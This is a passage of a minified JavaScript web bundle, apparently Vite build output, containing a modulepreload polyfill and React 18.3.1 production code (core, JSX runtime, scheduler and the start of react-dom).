function up(e,t){for(var r=0;r<t.length;r++){const s=t[r];if(typeof s!="string"&&!Array.isArray(s)){for(const a in s)if(a!=="default"&&!(a in e)){const i=Object.getOwnPropertyDescriptor(s,a);i&&Object.defineProperty(e,a,i.get?i:{enumerable:!0,get:()=>s[a]})}}}return Object.freeze(Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}))}(function(){const t=document.createElement("link").relList;if(t&&t.supports&&t.supports("modulepreload"))return;for(const a of document.querySelectorAll('link[rel="modulepreload"]'))s(a);new MutationObserver(a=>{for(const i of a)if(i.type==="childList")for(const l of i.addedNodes)l.tagName==="LINK"&&l.rel==="modulepreload"&&s(l)}).observe(document,{childList:!0,subtree:!0});function r(a){const i={};return a.integrity&&(i.integrity=a.integrity),a.referrerPolicy&&(i.referrerPolicy=a.referrerPolicy),a.crossOrigin==="use-credentials"?i.credentials="include":a.crossOrigin==="anonymous"?i.credentials="omit":i.credentials="same-origin",i}function s(a){if(a.ep)return;a.ep=!0;const i=r(a);fetch(a.href,i)}})();function dp(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var vh={exports:{}},Wi={},wh={exports:{}},Q={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var ja=Symbol.for("react.element"),hp=Symbol.for("react.portal"),fp=Symbol.for("react.fragment"),mp=Symbol.for("react.strict_mode"),pp=Symbol.for("react.profiler"),xp=Symbol.for("react.provider"),gp=Symbol.for("react.context"),yp=Symbol.for("react.forward_ref"),vp=Symbol.for("react.suspense"),wp=Symbol.for("react.memo"),bp=Symbol.for("react.lazy"),Ru=Symbol.iterator;function jp(e){return e===null||typeof e!="object"?null:(e=Ru&&e[Ru]||e["@@iterator"],typeof e=="function"?e:null)}var bh={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},jh=Object.assign,kh={};function hn(e,t,r){this.props=e,this.context=t,this.refs=kh,this.updater=r||bh}hn.prototype.isReactComponent={};hn.prototype.setState=function(e,t){if(typeof e!="object"&&typeof e!="function"&&e!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,t,"setState")};hn.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")};function _h(){}_h.prototype=hn.prototype;function bc(e,t,r){this.props=e,this.context=t,this.refs=kh,this.updater=r||bh}var jc=bc.prototype=new _h;jc.constructor=bc;jh(jc,hn.prototype);jc.isPureReactComponent=!0;var Pu=Array.isArray,Nh=Object.prototype.hasOwnProperty,kc={current:null},Sh={key:!0,ref:!0,__self:!0,__source:!0};function Eh(e,t,r){var s,a={},i=null,l=null;if(t!=null)for(s in t.ref!==void 0&&(l=t.ref),t.key!==void 0&&(i=""+t.key),t)Nh.call(t,s)&&!Sh.hasOwnProperty(s)&&(a[s]=t[s]);var o=arguments.length-2;if(o===1)a.children=r;else if(1<o){for(var c=Array(o),u=0;u<o;u++)c[u]=arguments[u+2];a.children=c}if(e&&e.defaultProps)for(s in o=e.defaultProps,o)a[s]===void 0&&(a[s]=o[s]);return{$$typeof:ja,type:e,key:i,ref:l,props:a,_owner:kc.current}}function kp(e,t){return{$$typeof:ja,type:e.type,key:t,ref:e.ref,props:e.props,_owner:e._owner}}function _c(e){return typeof e=="object"&&e!==null&&e.$$typeof===ja}function _p(e){var t={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,function(r){return t[r]})}var Au=/\/+/g;function El(e,t){return typeof e=="object"&&e!==null&&e.key!=null?_p(""+e.key):t.toString(36)}function Xa(e,t,r,s,a){var i=typeof e;(i==="undefined"||i==="boolean")&&(e=null);var l=!1;if(e===null)l=!0;else switch(i){case"string":case"number":l=!0;break;case"object":switch(e.$$typeof){case ja:case hp:l=!0}}if(l)return l=e,a=a(l),e=s===""?"."+El(l,0):s,Pu(a)?(r="",e!=null&&(r=e.replace(Au,"$&/")+"/"),Xa(a,t,r,"",function(u){return u})):a!=null&&(_c(a)&&(a=kp(a,r+(!a.key||l&&l.key===a.key?"":(""+a.key).replace(Au,"$&/")+"/")+e)),t.push(a)),1;if(l=0,s=s===""?".":s+":",Pu(e))for(var o=0;o<e.length;o++){i=e[o];var c=s+El(i,o);l+=Xa(i,t,r,c,a)}else if(c=jp(e),typeof c=="function")for(e=c.call(e),o=0;!(i=e.next()).done;)i=i.value,c=s+El(i,o++),l+=Xa(i,t,r,c,a);else if(i==="object")throw t=String(e),Error("Objects are not valid as a React child (found: "+(t==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":t)+"). If you meant to render a collection of children, use an array instead.");return l}function Ca(e,t,r){if(e==null)return e;var s=[],a=0;return Xa(e,s,"","",function(i){return t.call(r,i,a++)}),s}function Np(e){if(e._status===-1){var t=e._result;t=t(),t.then(function(r){(e._status===0||e._status===-1)&&(e._status=1,e._result=r)},function(r){(e._status===0||e._status===-1)&&(e._status=2,e._result=r)}),e._status===-1&&(e._status=0,e._result=t)}if(e._status===1)return e._result.default;throw e._result}var Ze={current:null},Za={transition:null},Sp={ReactCurrentDispatcher:Ze,ReactCurrentBatchConfig:Za,ReactCurrentOwner:kc};function Ch(){throw Error("act(...) is not supported in production builds of React.")}Q.Children={map:Ca,forEach:function(e,t,r){Ca(e,function(){t.apply(this,arguments)},r)},count:function(e){var t=0;return Ca(e,function(){t++}),t},toArray:function(e){return Ca(e,function(t){return t})||[]},only:function(e){if(!_c(e))throw Error("React.Children.only expected to receive a single React element child.");return e}};Q.Component=hn;Q.Fragment=fp;Q.Profiler=pp;Q.PureComponent=bc;Q.StrictMode=mp;Q.Suspense=vp;Q.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Sp;Q.act=Ch;Q.cloneElement=function(e,t,r){if(e==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var s=jh({},e.props),a=e.key,i=e.ref,l=e._owner;if(t!=null){if(t.ref!==void 0&&(i=t.ref,l=kc.current),t.key!==void 0&&(a=""+t.key),e.type&&e.type.defaultProps)var o=e.type.defaultProps;for(c in t)Nh.call(t,c)&&!Sh.hasOwnProperty(c)&&(s[c]=t[c]===void 0&&o!==void 0?o[c]:t[c])}var c=arguments.length-2;if(c===1)s.children=r;else if(1<c){o=Array(c);for(var u=0;u<c;u++)o[u]=arguments[u+2];s.children=o}return{$$typeof:ja,type:e.type,key:a,ref:i,props:s,_owner:l}};Q.createContext=function(e){return e={$$typeof:gp,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},e.Provider={$$typeof:xp,_context:e},e.Consumer=e};Q.createElement=Eh;Q.createFactory=function(e){var t=Eh.bind(null,e);return t.type=e,t};Q.createRef=function(){return{current:null}};Q.forwardRef=function(e){return{$$typeof:yp,render:e}};Q.isValidElement=_c;Q.lazy=function(e){return{$$typeof:bp,_payload:{_status:-1,_result:e},_init:Np}};Q.memo=function(e,t){return{$$typeof:wp,type:e,compare:t===void 0?null:t}};Q.startTransition=function(e){var t=Za.transition;Za.transition={};try{e()}finally{Za.transition=t}};Q.unstable_act=Ch;Q.useCallback=function(e,t){return Ze.current.useCallback(e,t)};Q.useContext=function(e){return Ze.current.useContext(e)};Q.useDebugValue=function(){};Q.useDeferredValue=function(e){return Ze.current.useDeferredValue(e)};Q.useEffect=function(e,t){return Ze.current.useEffect(e,t)};Q.useId=function(){return Ze.current.useId()};Q.useImperativeHandle=function(e,t,r){return Ze.current.useImperativeHandle(e,t,r)};Q.useInsertionEffect=function(e,t){return Ze.current.useInsertionEffect(e,t)};Q.useLayoutEffect=function(e,t){return Ze.current.useLayoutEffect(e,t)};Q.useMemo=function(e,t){return Ze.current.useMemo(e,t)};Q.useReducer=function(e,t,r){return Ze.current.useReducer(e,t,r)};Q.useRef=function(e){return Ze.current.useRef(e)};Q.useState=function(e){return Ze.current.useState(e)};Q.useSyncExternalStore=function(e,t,r){return Ze.current.useSyncExternalStore(e,t,r)};Q.useTransition=function(){return Ze.current.useTransition()};Q.version="18.3.1";wh.exports=Q;var b=wh.exports;const Nc=dp(b),Ep=up({__proto__:null,default:Nc},[b]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Cp=b,Tp=Symbol.for("react.element"),Rp=Symbol.for("react.fragment"),Pp=Object.prototype.hasOwnProperty,Ap=Cp.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,Op={key:!0,ref:!0,__self:!0,__source:!0};function Th(e,t,r){var s,a={},i=null,l=null;r!==void 0&&(i=""+r),t.key!==void 0&&(i=""+t.key),t.ref!==void 0&&(l=t.ref);for(s in t)Pp.call(t,s)&&!Op.hasOwnProperty(s)&&(a[s]=t[s]);if(e&&e.defaultProps)for(s in t=e.defaultProps,t)a[s]===void 0&&(a[s]=t[s]);return{$$typeof:Tp,type:e,key:i,ref:l,props:a,_owner:Ap.current}}Wi.Fragment=Rp;Wi.jsx=Th;Wi.jsxs=Th;vh.exports=Wi;var n=vh.exports,co={},Rh={exports:{}},xt={},Ph={exports:{}},Ah={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(e){function t(I,D){var W=I.length;I.push(D);e:for(;0<W;){var te=W-1>>>1,oe=I[te];if(0<a(oe,D))I[te]=D,I[W]=oe,W=te;else break e}}function r(I){return I.length===0?null:I[0]}function s(I){if(I.length===0)return null;var D=I[0],W=I.pop();if(W!==D){I[0]=W;e:for(var te=0,oe=I.length,yt=oe>>>1;te<yt;){var ze=2*(te+1)-1,Ge=I[ze],Ne=ze+1,F=I[Ne];if(0>a(Ge,W))Ne<oe&&0>a(F,Ge)?(I[te]=F,I[Ne]=W,te=Ne):(I[te]=Ge,I[ze]=W,te=ze);else if(Ne<oe&&0>a(F,W))I[te]=F,I[Ne]=W,te=Ne;else break e}}return D}function a(I,D){var W=I.sortIndex-D.sortIndex;return W!==0?W:I.id-D.id}if(typeof performance=="object"&&typeof performance.now=="function"){var i=performance;e.unstable_now=function(){return i.now()}}else{var l=Date,o=l.now();e.unstable_now=function(){return l.now()-o}}var c=[],u=[],h=1,p=null,x=3,v=!1,f=!1,w=!1,j=typeof setTimeout=="function"?setTimeout:null,y=typeof clearTimeout=="function"?clearTimeout:null,m=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function g(I){for(var D=r(u);D!==null;){if(D.callback===null)s(u);else if(D.startTime<=I)s(u),D.sortIndex=D.expirationTime,t(c,D);else break;D=r(u)}}function k(I){if(w=!1,g(I),!f)if(r(c)!==null)f=!0,ie(C);else{var D=r(u);D!==null&&ne(k,D.startTime-I)}}function C(I,D){f=!1,w&&(w=!1,y(T),T=-1),v=!0;var W=x;try{for(g(D),p=r(c);p!==null&&(!(p.expirationTime>D)||I&&!G());){var te=p.callback;if(typeof te=="function"){p.callback=null,x=p.priorityLevel;var oe=te(p.expirationTime<=D);D=e.unstable_now(),typeof oe=="function"?p.callback=oe:p===r(c)&&s(c),g(D)}else s(c);p=r(c)}if(p!==null)var yt=!0;else{var ze=r(u);ze!==null&&ne(k,ze.startTime-D),yt=!1}return yt}finally{p=null,x=W,v=!1}}var S=!1,R=null,T=-1,L=5,$=-1;function G(){return!(e.unstable_now()-$<L)}function fe(){if(R!==null){var I=e.unstable_now();$=I;var D=!0;try{D=R(!0,I)}finally{D?se():(S=!1,R=null)}}else S=!1}var se;if(typeof m=="function")se=function(){m(fe)};else if(typeof MessageChannel<"u"){var J=new MessageChannel,B=J.port2;J.port1.onmessage=fe,se=function(){B.postMessage(null)}}else se=function(){j(fe,0)};function ie(I){R=I,S||(S=!0,se())}function ne(I,D){T=j(function(){I(e.unstable_now())},D)}e.unstable_IdlePriority=5,e.unstable_ImmediatePriority=1,e.unstable_LowPriority=4,e.unstable_NormalPriority=3,e.unstable_Profiling=null,e.unstable_UserBlockingPriority=2,e.unstable_cancelCallback=function(I){I.callback=null},e.unstable_continueExecution=function(){f||v||(f=!0,ie(C))},e.unstable_forceFrameRate=function(I){0>I||125<I?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):L=0<I?Math.floor(1e3/I):5},e.unstable_getCurrentPriorityLevel=function(){return x},e.unstable_getFirstCallbackNode=function(){return r(c)},e.unstable_next=function(I){switch(x){case 1:case 2:case 3:var D=3;break;default:D=x}var W=x;x=D;try{return I()}finally{x=W}},e.unstable_pauseExecution=function(){},e.unstable_requestPaint=function(){},e.unstable_runWithPriority=function(I,D){switch(I){case 1:case 2:case 3:case 4:case 5:break;default:I=3}var W=x;x=I;try{return D()}finally{x=W}},e.unstable_scheduleCallback=function(I,D,W){var te=e.unstable_now();switch(typeof W=="object"&&W!==null?(W=W.delay,W=typeof W=="number"&&0<W?te+W:te):W=te,I){case 1:var oe=-1;break;case 2:oe=250;break;case 5:oe=1073741823;break;case 4:oe=1e4;break;default:oe=5e3}return oe=W+oe,I={id:h++,callback:D,priorityLevel:I,startTime:W,expirationTime:oe,sortIndex:-1},W>te?(I.sortIndex=W,t(u,I),r(c)===null&&I===r(u)&&(w?(y(T),T=-1):w=!0,ne(k,W-te))):(I.sortIndex=oe,t(c,I),f||v||(f=!0,ie(C))),I},e.unstable_shouldYield=G,e.unstable_wrapCallback=function(I){var D=x;return function(){var W=x;x=D;try{return I.apply(this,arguments)}finally{x=W}}}})(Ah);Ph.exports=Ah;var Ip=Ph.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var $p=b,pt=Ip;function A(e){for(var t="https://reactjs.org/docs/error-decoder.html?invariant="+e,r=1;r<arguments.length;r++)t+="&args[]="+encodeURIComponent(arguments[r]);return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var Oh=new Set,Yn={};function js(e,t){tn(e,t),tn(e+"Capture",t)}function tn(e,t){for(Yn[e]=t,e=0;e<t.length;e++)Oh.add(t[e])}var or=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),uo=Object.prototype.hasOwnProperty,zp=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,Ou={},Iu={};function Lp(e){return uo.call(Iu,e)?!0:uo.call(Ou,e)?!1:zp.test(e)?Iu[e]=!0:(Ou[e]=!0,!1)}function Up(e,t,r,s){if(r!==null&&r.type===0)return!1;switch(typeof t){case"function":case"symbol":return!0;case"boolean":return s?!1:r!==null?!r.acceptsBooleans:(e=e.toLowerCase().slice(0,5),e!=="data-"&&e!=="aria-");default:return!1}}function Dp(e,t,r,s){if(t===null||typeof t>"u"||Up(e,t,r,s))return!0;if(s)return!1;if(r!==null)switch(r.type){case 3:return!t;case 4:return t===!1;case 5:return isNaN(t);case 6:return isNaN(t)||1>t}return!1}function et(e,t,r,s,a,i,l){this.acceptsBooleans=t===2||t===3||t===4,this.attributeName=s,this.attributeNamespace=a,this.mustUseProperty=r,this.propertyName=e,this.type=t,this.sanitizeURL=i,this.removeEmptyString=l}var We={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){We[e]=new et(e,0,!1,e,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var t=e[0];We[t]=new et(t,1,!1,e[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(e){We[e]=new et(e,2,!1,e.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){We[e]=new et(e,2,!1,e,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){We[e]=new et(e,3,!1,e.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(e){We[e]=new et(e,3,!0,e,null,!1,!1)});["capture","download"].forEach(function(e){We[e]=new et(e,4,!1,e,null,!1,!1)});["cols","rows","size","span"].forEach(function(e){We[e]=new et(e,6,!1,e,null,!1,!1)});["rowSpan","start"].forEach(function(e){We[e]=new et(e,5,!1,e.toLowerCase(),null,!1,!1)});var Sc=/[\-:]([a-z])/g;function Ec(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var t=e.replace(Sc,Ec);We[t]=new et(t,1,!1,e,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var t=e.replace(Sc,Ec);We[t]=new et(t,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(e){var t=e.replace(Sc,Ec);We[t]=new et(t,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(e){We[e]=new et(e,1,!1,e.toLowerCase(),null,!1,!1)});We.xlinkHref=new et("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(e){We[e]=new et(e,1,!1,e.toLowerCase(),null,!0,!0)});function Cc(e,t,r,s){var a=We.hasOwnProperty(t)?We[t]:null;(a!==null?a.type!==0:s||!(2<t.length)||t[0]!=="o"&&t[0]!=="O"||t[1]!=="n"&&t[1]!=="N")&&(Dp(t,r,a,s)&&(r=null),s||a===null?Lp(t)&&(r===null?e.removeAttribute(t):e.setAttribute(t,""+r)):a.mustUseProperty?e[a.propertyName]=r===null?a.type===3?!1:"":r:(t=a.attributeName,s=a.attributeNamespace,r===null?e.removeAttribute(t):(a=a.type,r=a===3||a===4&&r===!0?"":""+r,s?e.setAttributeNS(s,t,r):e.setAttribute(t,r))))}var fr=$p.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,Ta=Symbol.for("react.element"),$s=Symbol.for("react.portal"),zs=Symbol.for("react.fragment"),Tc=Symbol.for("react.strict_mode"),ho=Symbol.for("react.profiler"),Ih=Symbol.for("react.provider"),$h=Symbol.for("react.context"),Rc=Symbol.for("react.forward_ref"),fo=Symbol.for("react.suspense"),mo=Symbol.for("react.suspense_list"),Pc=Symbol.for("react.memo"),yr=Symbol.for("react.lazy"),zh=Symbol.for("react.offscreen"),$u=Symbol.iterator;function Nn(e){return e===null||typeof e!="object"?null:(e=$u&&e[$u]||e["@@iterator"],typeof e=="function"?e:null)}var je=Object.assign,Cl;function In(e){if(Cl===void 0)try{throw Error()}catch(r){var t=r.stack.trim().match(/\n( *(at )?)/);Cl=t&&t[1]||""}return`
`+Cl+e}var Tl=!1;function Rl(e,t){if(!e||Tl)return"";Tl=!0;var r=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(t)if(t=function(){throw Error()},Object.defineProperty(t.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(t,[])}catch(u){var s=u}Reflect.construct(e,[],t)}else{try{t.call()}catch(u){s=u}e.call(t.prototype)}else{try{throw Error()}catch(u){s=u}e()}}catch(u){if(u&&s&&typeof u.stack=="string"){for(var a=u.stack.split(`
`),i=s.stack.split(`
`),l=a.length-1,o=i.length-1;1<=l&&0<=o&&a[l]!==i[o];)o--;for(;1<=l&&0<=o;l--,o--)if(a[l]!==i[o]){if(l!==1||o!==1)do if(l--,o--,0>o||a[l]!==i[o]){var c=`
`+a[l].replace(" at new "," at ");return e.displayName&&c.includes("<anonymous>")&&(c=c.replace("<anonymous>",e.displayName)),c}while(1<=l&&0<=o);break}}}finally{Tl=!1,Error.prepareStackTrace=r}return(e=e?e.displayName||e.name:"")?In(e):""}function Mp(e){switch(e.tag){case 5:return In(e.type);case 16:return In("Lazy");case 13:return In("Suspense");case 19:return In("SuspenseList");case 0:case 2:case 15:return e=Rl(e.type,!1),e;case 11:return e=Rl(e.type.render,!1),e;case 1:return e=Rl(e.type,!0),e;default:return""}}function po(e){if(e==null)return null;if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case zs:return"Fragment";case $s:return"Portal";case ho:return"Profiler";case Tc:return"StrictMode";case fo:return"Suspense";case mo:return"SuspenseList"}if(typeof e=="object")switch(e.$$typeof){case $h:return(e.displayName||"Context")+".Consumer";case Ih:return(e._context.displayName||"Context")+".Provider";case Rc:var t=e.render;return e=e.displayName,e||(e=t.displayName||t.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case Pc:return t=e.displayName||null,t!==null?t:po(e.type)||"Memo";case yr:t=e._payload,e=e._init;try{return po(e(t))}catch{}}return null}function Fp(e){var t=e.type;switch(e.tag){case 24:return"Cache";case 9:return(t.displayName||"Context")+".Consumer";case 10:return(t._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=t.render,e=e.displayName||e.name||"",t.displayName||(e!==""?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return t;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return po(t);case 8:return t===Tc?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof t=="function")return t.displayName||t.name||null;if(typeof t=="string")return t}return null}function Ur(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function Lh(e){var t=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(t==="checkbox"||t==="radio")}function Bp(e){var t=Lh(e)?"checked":"value",r=Object.getOwnPropertyDescriptor(e.constructor.prototype,t),s=""+e[t];if(!e.hasOwnProperty(t)&&typeof r<"u"&&typeof r.get=="function"&&typeof r.set=="function"){var a=r.get,i=r.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return a.call(this)},set:function(l){s=""+l,i.call(this,l)}}),Object.defineProperty(e,t,{enumerable:r.enumerable}),{getValue:function(){return s},setValue:function(l){s=""+l},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function Ra(e){e._valueTracker||(e._valueTracker=Bp(e))}function Uh(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var r=t.getValue(),s="";return e&&(s=Lh(e)?e.checked?"true":"false":e.value),e=s,e!==r?(t.setValue(e),!0):!1}function di(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function xo(e,t){var r=t.checked;return je({},t,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:r??e._wrapperState.initialChecked})}function zu(e,t){var r=t.defaultValue==null?"":t.defaultValue,s=t.checked!=null?t.checked:t.defaultChecked;r=Ur(t.value!=null?t.value:r),e._wrapperState={initialChecked:s,initialValue:r,controlled:t.type==="checkbox"||t.type==="radio"?t.checked!=null:t.value!=null}}function Dh(e,t){t=t.checked,t!=null&&Cc(e,"checked",t,!1)}function go(e,t){Dh(e,t);var r=Ur(t.value),s=t.type;if(r!=null)s==="number"?(r===0&&e.value===""||e.value!=r)&&(e.value=""+r):e.value!==""+r&&(e.value=""+r);else if(s==="submit"||s==="reset"){e.removeAttribute("value");return}t.hasOwnProperty("value")?yo(e,t.type,r):t.hasOwnProperty("defaultValue")&&yo(e,t.type,Ur(t.defaultValue)),t.checked==null&&t.defaultChecked!=null&&(e.defaultChecked=!!t.defaultChecked)}function Lu(e,t,r){if(t.hasOwnProperty("value")||t.hasOwnProperty("defaultValue")){var s=t.type;if(!(s!=="submit"&&s!=="reset"||t.value!==void 0&&t.value!==null))return;t=""+e._wrapperState.initialValue,r||t===e.value||(e.value=t),e.defaultValue=t}r=e.name,r!==""&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,r!==""&&(e.name=r)}function yo(e,t,r){(t!=="number"||di(e.ownerDocument)!==e)&&(r==null?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+r&&(e.defaultValue=""+r))}var $n=Array.isArray;function Gs(e,t,r,s){if(e=e.options,t){t={};for(var a=0;a<r.length;a++)t["$"+r[a]]=!0;for(r=0;r<e.length;r++)a=t.hasOwnProperty("$"+e[r].value),e[r].selected!==a&&(e[r].selected=a),a&&s&&(e[r].defaultSelected=!0)}else{for(r=""+Ur(r),t=null,a=0;a<e.length;a++){if(e[a].value===r){e[a].selected=!0,s&&(e[a].defaultSelected=!0);return}t!==null||e[a].disabled||(t=e[a])}t!==null&&(t.selected=!0)}}function vo(e,t){if(t.dangerouslySetInnerHTML!=null)throw Error(A(91));return je({},t,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function Uu(e,t){var r=t.value;if(r==null){if(r=t.children,t=t.defaultValue,r!=null){if(t!=null)throw Error(A(92));if($n(r)){if(1<r.length)throw Error(A(93));r=r[0]}t=r}t==null&&(t=""),r=t}e._wrapperState={initialValue:Ur(r)}}function Mh(e,t){var r=Ur(t.value),s=Ur(t.defaultValue);r!=null&&(r=""+r,r!==e.value&&(e.value=r),t.defaultValue==null&&e.defaultValue!==r&&(e.defaultValue=r)),s!=null&&(e.defaultValue=""+s)}function Du(e){var t=e.textContent;t===e._wrapperState.initialValue&&t!==""&&t!==null&&(e.value=t)}function Fh(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function wo(e,t){return e==null||e==="http://www.w3.org/1999/xhtml"?Fh(t):e==="http://www.w3.org/2000/svg"&&t==="foreignObject"?"http://www.w3.org/1999/xhtml":e}var Pa,Bh=function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(t,r,s,a){MSApp.execUnsafeLocalFunction(function(){return e(t,r,s,a)})}:e}(function(e,t){if(e.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in e)e.innerHTML=t;else{for(Pa=Pa||document.createElement("div"),Pa.innerHTML="<svg>"+t.valueOf().toString()+"</svg>",t=Pa.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;t.firstChild;)e.appendChild(t.firstChild)}});function Qn(e,t){if(t){var r=e.firstChild;if(r&&r===e.lastChild&&r.nodeType===3){r.nodeValue=t;return}}e.textContent=t}var Dn={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},Wp=["Webkit","ms","Moz","O"];Object.keys(Dn).forEach(function(e){Wp.forEach(function(t){t=t+e.charAt(0).toUpperCase()+e.substring(1),Dn[t]=Dn[e]})});function Wh(e,t,r){return t==null||typeof t=="boolean"||t===""?"":r||typeof t!="number"||t===0||Dn.hasOwnProperty(e)&&Dn[e]?(""+t).trim():t+"px"}function Vh(e,t){e=e.style;for(var r in t)if(t.hasOwnProperty(r)){var s=r.indexOf("--")===0,a=Wh(r,t[r],s);r==="float"&&(r="cssFloat"),s?e.setProperty(r,a):e[r]=a}}var 